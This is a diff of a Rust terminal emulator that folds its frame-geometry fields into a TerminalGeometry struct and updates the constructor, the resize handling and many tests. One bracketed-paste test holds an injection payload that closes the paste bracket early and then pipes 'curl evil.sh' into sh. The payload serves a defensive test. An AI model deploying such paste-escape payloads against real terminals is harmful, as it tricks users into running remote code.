@@ -22,6 +22,7 @@ use std::os::fd::RawFd;
 use std::rc::Rc;
 use std::time::{Duration, Instant};
 
+use crate::app::geometry::TerminalGeometry;
 use crate::app::message::{PointerEvent, Side, ToTerminal, ToWindow};
 use crate::color::Theme;
 use crate::config::TabBarConfig;
@@ -33,11 +34,11 @@ use crate::grid::{
 use crate::input;
 use crate::mouse::{self, MouseButton, MouseKind};
 use crate::platform::browser;
-use crate::platform::geom::{Rect, Scale};
+use crate::platform::geom::Rect;
 use crate::platform::scroll::{self, Scrollbar};
 use crate::pty::{Launch, Pty, TtyMode, ZombieChild};
 use crate::render::display::DisplayList;
-use crate::term_render::{self, CellMetrics, CellSpan, CursorRender, CursorShape, Selection};
+use crate::term_render::{self, CellSpan, CursorRender, CursorShape, Selection};
 use crate::vt::Parser;
 
 /// The cursor blink half-period: how long each of the on/off phases lasts.
@@ -322,15 +323,8 @@ pub(super) struct TerminalCore {
     /// The content changed and a frame should be drawn. The window reads it to
     /// pace repaints, and sets it on a geometry change it drives.
     pub(super) dirty: bool,
-    /// Frame geometry, all window-computed and shipped over on a resize: the fixed
-    /// cell box, the device surface size the grid lays out in, the device padding inset
-    /// on every side, and the display scale the chrome is sized in.
-    metrics: CellMetrics,
-    width: u32,
-    height: u32,
-    pad: i32,
-    origin_y: i32,
-    scale: Scale,
+    /// Frame geometry, window-computed and shipped over on a resize.
+    geom: TerminalGeometry,
     /// This tab's overlay scrollbar: it fades in on a scroll and out after it, and grows
     /// into a grabbable slider under the pointer. Per-tab because the scrollback it
     /// describes is: each tab scrolls its own history, and only the visible one animates.
@@ -352,19 +346,11 @@ pub(super) struct TerminalCore {
 }
 
 impl TerminalCore {
-    /// Build the core at the window's initial geometry. The window owns the fonts
-    /// and scale, so it computes `metrics`/`width`/`height`/`pad` and hands over
-    /// copies; a later [`ToTerminal::Resize`] keeps them current. Demo mode starts
-    /// on a static grid; live mode starts blank until the shell fills it.
-    pub(super) fn new(
-        demo: bool,
-        cols: usize,
-        rows: usize,
-        metrics: CellMetrics,
-        width: u32,
-        height: u32,
-        pad: i32,
-    ) -> Self {
+    /// Build the core at the window's current geometry; a later [`ToTerminal::Resize`]
+    /// keeps it current. Demo mode starts on a static grid; live mode starts blank
+    /// until the shell fills it.
+    pub(super) fn new(demo: bool, geom: TerminalGeometry) -> Self {
+        let (cols, rows) = (geom.cols, geom.rows);
         let screen = if demo {
             demo_screen(cols, rows)
         } else {
@@ -397,12 +383,7 @@ impl TerminalCore {
             hover_cell: None,
             probe: LinkProbe::default(),
             dirty: true,
-            metrics,
-            width,
-            height,
-            pad,
-            origin_y: pad,
-            scale: Scale::ONE,
+            geom,
             scrollbar: Scrollbar::default(),
             outbox: Vec::new(),
             last_title: String::new(),
@@ -500,7 +481,7 @@ impl TerminalCore {
 
     #[cfg(test)]
     pub(super) fn origin_y(&self) -> i32 {
-        self.origin_y
+        self.geom.origin_y
     }
 
     /// The title shown for this core, with the empty/default title mapped to the
@@ -682,27 +663,14 @@ impl TerminalCore {
                 self.apply_pointer(event, mods)?;
                 Ok(false)
             }
-            ToTerminal::Resize {
-                cols,
-                rows,
-                width,
-                height,
-                metrics,
-                pad,
-                origin_y,
-                scale,
-            } => {
+            ToTerminal::Resize(geom) => {
+                let (cols, rows) = (geom.cols, geom.rows);
                 // Adopt the window's fresh geometry, then resize the grid to it. In
                 // demo mode there is no child; rebuild the static grid. Otherwise
                 // push the size to the child (TIOCSWINSZ → SIGWINCH). The PTY resize
                 // is best-effort: a resize on a dead child just surfaces as EOF on
                 // the next read, which shuts down cleanly.
-                self.width = width;
-                self.height = height;
-                self.metrics = metrics;
-                self.pad = pad;
-                self.origin_y = origin_y;
-                self.scale = scale;
+                self.geom = geom;
                 if self.demo {
                     // The grid is replaced wholesale, so no row id minted against the
                     // old one survives it.
@@ -718,7 +686,7 @@ impl TerminalCore {
                     self.drag = None;
                     let carried = self.carry_selection(effect);
                     self.set_selection(carried);
-                    self.screen.set_pixel_size(width, height);
+                    self.screen.set_pixel_size(geom.width, geom.height);
                     // Reflow the grid now (above) for smooth visuals, but debounce the child's
                     // winsize: telling the shell on every configure floods it with prompt
                     // redraws that mush together under a drag. `flush_winsize_if_due` pushes
@@ -1584,13 +1552,13 @@ impl TerminalCore {
                 screen: &self.screen,
                 bell: self.bell_flashing(),
                 theme: self.screen.theme(),
-                metrics: self.metrics,
-                surface: (self.width as i32, self.height as i32),
-                origin: (self.pad, self.origin_y),
+                metrics: self.geom.metrics,
+                surface: (self.geom.width as i32, self.geom.height as i32),
+                origin: (self.geom.pad, self.geom.origin_y),
                 cursor,
                 selection: self.selection,
                 hover: self.hover,
-                scale: self.scale,
+                scale: self.geom.scale,
                 scrollbar: &self.scrollbar,
             },
         );
@@ -1601,9 +1569,9 @@ impl TerminalCore {
     /// grabbable exactly where it is drawn.
     fn scroll_column(&self) -> Rect {
         term_render::scroll_column(
-            (self.width as i32, self.height as i32),
-            (self.pad, self.origin_y),
-            self.metrics,
+            (self.geom.width as i32, self.geom.height as i32),
+            (self.geom.pad, self.geom.origin_y),
+            self.geom.metrics,
             self.screen.dimensions().1,
         )
     }
@@ -1611,13 +1579,13 @@ impl TerminalCore {
     /// The thumb as it is drawn right now, or `None` when there is nothing to scroll.
     fn scroll_thumb(&self) -> Option<Rect> {
         let (content, viewport) = self.screen.scroll_extent();
-        let track = term_render::scroll_lane(self.scroll_column(), self.scale).track;
+        let track = term_render::scroll_lane(self.scroll_column(), self.geom.scale).track;
         scroll::thumb(
             track,
             viewport,
             content,
             self.screen.scroll_position(),
-            term_render::scroll_min_thumb(self.scale),
+            term_render::scroll_min_thumb(self.geom.scale),
         )
     }
 
@@ -1632,7 +1600,7 @@ impl TerminalCore {
     /// thumb rather than starting a selection in the grid beneath it.
     pub(super) fn on_scrollbar(&self, x: f32, y: f32) -> bool {
         self.scrollable()
-            && term_render::scroll_lane(self.scroll_column(), self.scale)
+            && term_render::scroll_lane(self.scroll_column(), self.geom.scale)
                 .grab
                 .contains(x, y)
     }
@@ -1645,7 +1613,7 @@ impl TerminalCore {
         }
         let near = self.scrollable()
             && at.is_some_and(|(x, y)| {
-                term_render::scroll_lane(self.scroll_column(), self.scale)
+                term_render::scroll_lane(self.scroll_column(), self.geom.scale)
                     .zone
                     .contains(x, y)
             });
@@ -1685,7 +1653,7 @@ impl TerminalCore {
             return;
         };
         let (content, viewport) = self.screen.scroll_extent();
-        let track = term_render::scroll_lane(self.scroll_column(), self.scale).track;
+        let track = term_render::scroll_lane(self.scroll_column(), self.geom.scale).track;
         let at = self.screen.scroll_position();
         let to = scroll::scroll_at_thumb(track, thumb.h, viewport, content, y as i32 - grab);
         if to == at {
@@ -1983,6 +1951,8 @@ fn demo_screen(cols: usize, rows: usize) -> Screen {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::platform::geom::Scale;
+    use crate::term_render::CellMetrics;
     use std::path::Path;
 
     #[test]
@@ -2008,7 +1978,7 @@ mod tests {
         // write blocked here with an infinite `poll(POLLOUT)` on the one thread that also
         // renders, dispatches Wayland and delivers keys: no repaint, no Ctrl+C, and no
         // `pong`, so the compositor greyed the window out too.
-        let mut core = TerminalCore::new(false, 80, 24, METRICS, 640, 384, 0);
+        let mut core = TerminalCore::new(false, geom(80, 24, 640, 384));
         if core.spawn_program(&["/bin/sleep", "30"]).is_err() {
             eprintln!("pty spawn unavailable in this environment; skipping");
             return;
@@ -2084,7 +2054,7 @@ mod tests {
         // following CR as a real Enter and runs `echo hi`, then receives the rest as
         // ordinary typing and the next CR executes *that*. One pasted line, two commands,
         // and the second never displayed as pasted text.
-        let mut core = TerminalCore::new(true, 80, 24, METRICS, 640, 384, 0);
+        let mut core = TerminalCore::new(true, geom(80, 24, 640, 384));
         core.feed_test_bytes(b"\x1b[?2004h"); // the program wants bracketed paste
         let payload = "echo hi\x1b[201~\ncurl evil.sh|sh\n";
         core.apply(ToTerminal::Paste(payload.as_bytes().to_vec()))
@@ -2183,7 +2153,7 @@ mod tests {
         // discipline: PTY -> refresh_tty_mode -> the frame the window pulls. Only the
         // one-line call from `Tabs::note_settle` is left out, and that is the same hook
         // the cwd/foreground refresh already rides.
-        let mut core = TerminalCore::new(false, 40, 10, METRICS, 320, 160, 0);
+        let mut core = TerminalCore::new(false, geom(40, 10, 320, 160));
         if core.spawn_program(&["/bin/cat"]).is_err() {
             eprintln!("fork/exec unavailable; skipping the live tty-mode test");
             return;
@@ -2239,7 +2209,7 @@ mod tests {
         // The contract the corner notice rests on. Before the shell marks a prompt there
         // is no answer at all — not a zero, not a guess from output bytes — because until
         // then the terminal genuinely does not know whether a prompt has appeared.
-        let mut core = TerminalCore::new(true, 80, 24, METRICS, 640, 384, 0);
+        let mut core = TerminalCore::new(true, geom(80, 24, 640, 384));
         core.spawned_at = Some(Instant::now() - Duration::from_millis(120));
         assert_eq!(
             core.take_startup_time(),
@@ -2267,7 +2237,7 @@ mod tests {
         // The no-integration case, which must stay silent rather than guess. A shell with
         // no OSC 133 prints plenty and marks nothing, and a terminal that timed *that*
         // would be warning about programs that are not prompts.
-        let mut core = TerminalCore::new(true, 80, 24, METRICS, 640, 384, 0);
+        let mut core = TerminalCore::new(true, geom(80, 24, 640, 384));
         core.spawned_at = Some(Instant::now() - Duration::from_secs(30));
         core.feed_test_bytes(b"$ ls\r\nCargo.toml  src\r\n$ ");
         assert_eq!(
@@ -2283,7 +2253,7 @@ mod tests {
         // at the fork and the child's own `OSC 133;A` is what stops it. This is the path
         // the shell integration drives, with the shim's one byte sequence standing in for
         // the shim.
-        let mut core = TerminalCore::new(false, 40, 10, METRICS, 320, 160, 0);
+        let mut core = TerminalCore::new(false, geom(40, 10, 320, 160));
         if core
             .spawn_program(&["/bin/sh", "-c", "printf '\\033]133;A\\007'"])
             .is_err()
@@ -2326,7 +2296,7 @@ mod tests {
             eprintln!("gatherer unavailable; skipping the end-of-stream pump test");
             return;
         };
-        let mut core = TerminalCore::new(false, 40, 10, METRICS, 400, 200, 0);
+        let mut core = TerminalCore::new(false, geom(40, 10, 400, 200));
         core.pty = Some(pty);
         core.gatherer = Some(gatherer);
 
@@ -2377,7 +2347,7 @@ mod tests {
                 )
             })
         };
-        let mut core = TerminalCore::new(true, 80, 24, METRICS, 640, 384, 0);
+        let mut core = TerminalCore::new(true, geom(80, 24, 640, 384));
         core.focused = true;
         assert!(!locked(&core), "a cooked tty draws no lock");
 
@@ -2393,7 +2363,7 @@ mod tests {
     fn synchronized_output_holds_the_frame_and_then_shows_it_whole() {
         // A program brackets a frame with `?2026 h` … `?2026 l` so it is never seen
         // half-drawn. The grid keeps updating throughout — only the *presentation* waits.
-        let mut core = TerminalCore::new(true, 80, 24, METRICS, 640, 384, 0);
+        let mut core = TerminalCore::new(true, geom(80, 24, 640, 384));
         core.feed_test_bytes(b"\x1b[?2026h");
         assert!(core.holds_frame(), "the child is mid-frame");
         assert!(core.dirty, "and we still know a frame is owed");
@@ -2413,7 +2383,7 @@ mod tests {
 
     #[test]
     fn ctrl_shift_up_jumps_to_the_prompt_and_stays_out_of_the_way_without_one() {
-        let mut core = TerminalCore::new(false, 20, 5, METRICS, 640, 384, 0);
+        let mut core = TerminalCore::new(false, geom(20, 5, 640, 384));
         // No shell integration: the chord is not ours, and it must fall through to the
         // child rather than being swallowed. A terminal that eats a key and does nothing
         // with it is worse than one that never claimed the key.
@@ -2441,7 +2411,7 @@ mod tests {
         // The GPU clear must use the same colour as the display list's base fill, or the
         // flash tears along the edges the list does not cover. Two places computing "the
         // background" independently is how that happens, so they compute it once.
-        let mut core = TerminalCore::new(true, 80, 24, METRICS, 640, 384, 0);
+        let mut core = TerminalCore::new(true, geom(80, 24, 640, 384));
         let calm = core.clear_color();
         assert!(!core.bell_flashing());
 
@@ -2470,7 +2440,7 @@ mod tests {
         // you are the one driving the child (a shell tab-completing against nothing rings
         // the bell on every miss), so the flash would be feedback on your own keystrokes:
         // pure noise. The BEL is swallowed, and the surface never lifts.
-        let mut core = TerminalCore::new(true, 80, 24, METRICS, 640, 384, 0);
+        let mut core = TerminalCore::new(true, geom(80, 24, 640, 384));
         core.focused = true;
         let calm = core.clear_color();
 
@@ -2501,7 +2471,7 @@ mod tests {
         // sequences, or simply never send the second. Without a deadline that is a window
         // that never repaints again, which is far worse than the torn frame the mode
         // exists to prevent. So the deadline is the feature, not a safety net bolted on.
-        let mut core = TerminalCore::new(true, 80, 24, METRICS, 640, 384, 0);
+        let mut core = TerminalCore::new(true, geom(80, 24, 640, 384));
         core.feed_test_bytes(b"\x1b[?2026h");
         assert!(core.holds_frame());
 
@@ -2551,7 +2521,7 @@ mod tests {
         // The other half of the deadline's contract: servicing timers must not end a
         // frame the child is still legitimately drawing, or `?2026` would tear exactly
         // the frames it exists to keep whole.
-        let mut core = TerminalCore::new(true, 80, 24, METRICS, 640, 384, 0);
+        let mut core = TerminalCore::new(true, geom(80, 24, 640, 384));
         core.feed_test_bytes(b"\x1b[?2026h");
         let armed = core.sync_deadline();
         assert!(armed.is_some(), "entering arms the deadline");
@@ -2573,7 +2543,7 @@ mod tests {
     #[test]
     fn tab_label_prefers_a_title_then_a_foreground_job_then_the_cwd() {
         let cfg = TabBarConfig::default();
-        let mut core = TerminalCore::new(true, 80, 24, METRICS, 640, 384, 0);
+        let mut core = TerminalCore::new(true, geom(80, 24, 640, 384));
         // No title and no known cwd: the bare fallback.
         assert_eq!(core.tab_label(&cfg), "shell");
         // A known cwd (as /proc reports it) shows in place of the fallback. A path
@@ -2608,7 +2578,7 @@ mod tests {
         // local prompt has to say what is true again, which is what the injected
         // `_bnkterm_report` hook emits (see crate::shell_integration).
         let cfg = TabBarConfig::default();
-        let mut core = TerminalCore::new(true, 80, 24, METRICS, 640, 384, 0);
+        let mut core = TerminalCore::new(true, geom(80, 24, 640, 384));
         core.cwd = Some(std::path::PathBuf::from("/opt/service"));
 
         core.feed_test_bytes(b"\x1b]0;ada@remote: ~/srv\x07\x1b]7;file://remote/srv\x07");
@@ -2633,7 +2603,7 @@ mod tests {
         // its own title. The prefix is the cwd's final component, followed by the
         // separator and title.
         let cfg = TabBarConfig::default();
-        let mut core = TerminalCore::new(true, 80, 24, METRICS, 640, 384, 0);
+        let mut core = TerminalCore::new(true, geom(80, 24, 640, 384));
         core.cwd = Some(std::path::PathBuf::from("/home/ada/projects/bnkterm"));
         core.last_title = "fixing the parser".to_string();
 
@@ -2659,6 +2629,20 @@ mod tests {
         descent: 4,
         lock_glyph: true,
     };
+
+    /// A geometry on [`METRICS`] cells, with no padding at unity scale.
+    fn geom(cols: usize, rows: usize, width: u32, height: u32) -> TerminalGeometry {
+        TerminalGeometry {
+            cols,
+            rows,
+            width,
+            height,
+            metrics: METRICS,
+            pad: 0,
+            origin_y: 0,
+            scale: Scale::ONE,
+        }
+    }
 
     #[test]
     fn demo_screen_fills_a_grid_without_panicking() {
@@ -2733,16 +2717,7 @@ mod tests {
     /// A demo core (static grid with content in the top-left) for driving pointer
     /// events through the real selection path.
     fn pointer_core() -> TerminalCore {
-        let metrics = CellMetrics {
-            size: 16,
-            w: 8,
-            h: 16,
-            baseline: 12,
-            ascent: 12,
-            descent: 4,
-            lock_glyph: true,
-        };
-        TerminalCore::new(true, 80, 24, metrics, 80 * 8, 24 * 16, 0)
+        TerminalCore::new(true, geom(80, 24, 80 * 8, 24 * 16))
     }
 
     /// The plain helpers stay in the cell's left half, whose nearer edge is the
@@ -2810,16 +2785,7 @@ mod tests {
     /// A blank (non-demo) core with `text` printed at the top-left, for driving the
     /// hyperlink gestures over content a case chooses.
     fn core_showing(text: &str) -> TerminalCore {
-        let metrics = CellMetrics {
-            size: 16,
-            w: 8,
-            h: 16,
-            baseline: 12,
-            ascent: 12,
-            descent: 4,
-            lock_glyph: true,
-        };
-        let mut core = TerminalCore::new(false, 80, 24, metrics, 80 * 8, 24 * 16, 0);
+        let mut core = TerminalCore::new(false, geom(80, 24, 80 * 8, 24 * 16));
         let mut parser = Parser::new();
         parser.advance_bytes(&mut core.screen, text.as_bytes());
         core
@@ -3392,17 +3358,8 @@ mod tests {
         let picked = core.selection.expect("word selected");
         assert_eq!(grid_text(&core.screen, picked.anchor, picked.head), "world");
 
-        core.apply(ToTerminal::Resize {
-            cols: 40,
-            rows: 12,
-            width: 40 * 8,
-            height: 12 * 16,
-            metrics: METRICS,
-            pad: 0,
-            origin_y: 0,
-            scale: Scale::ONE,
-        })
-        .unwrap();
+        core.apply(ToTerminal::Resize(geom(40, 12, 40 * 8, 12 * 16)))
+            .unwrap();
 
         let sel = core
             .selection
@@ -3420,17 +3377,8 @@ mod tests {
         core.feed_test_bytes(b"hello world"); // and put a word on it to select
         select_word(&mut core, 6, 0);
         assert!(core.selection.is_some());
-        core.apply(ToTerminal::Resize {
-            cols: 40,
-            rows: 12,
-            width: 40 * 8,
-            height: 12 * 16,
-            metrics: METRICS,
-            pad: 0,
-            origin_y: 0,
-            scale: Scale::ONE,
-        })
-        .unwrap();
+        core.apply(ToTerminal::Resize(geom(40, 12, 40 * 8, 12 * 16)))
+            .unwrap();
         assert!(
             core.selection.is_none(),
             "an alt-screen selection is dropped"
@@ -3688,7 +3636,7 @@ mod tests {
     /// padding, unity scale, so the lane lands at a hand-checkable place (see
     /// [`lane_x`]).
     fn scrollable_core(lines: usize) -> TerminalCore {
-        let mut core = TerminalCore::new(false, 80, 24, METRICS, 80 * 8, 24 * 16, 0);
+        let mut core = TerminalCore::new(false, geom(80, 24, 80 * 8, 24 * 16));
         let mut parser = Parser::new();
         for i in 0..lines {
             parser.advance_bytes(&mut core.screen, format!("line {i}\r\n").as_bytes());
